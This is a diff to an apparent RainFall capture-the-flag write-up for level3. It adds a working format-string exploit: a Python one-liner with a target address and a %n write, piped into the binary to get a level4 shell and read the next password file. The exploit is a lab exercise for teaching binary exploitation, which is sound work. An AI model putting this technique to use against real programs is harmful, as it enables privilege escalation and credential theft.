@@ -136,4 +136,17 @@ level3@RainFall:~$ objdump -d ./level3 | less
 ```
 
 We have to focus on mov and compare after `printf` function.
-So we going to put `0x804988c` memory in little median 
+So we going to put `0x804988c` memory in little median.
+
+Let's exploit it!
+
+```bash
+level3@RainFall:~$  python -c 'print"\x8c\x98\x04\x08%08x%08x%044x%n"' > /tmp/exploit
+level3@RainFall:~$ cat /tmp/exploit - | ./level3
+�00000200b7fd1ac0000000000000000000000000000000000000b7ff37d0
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+REMOVED
+```
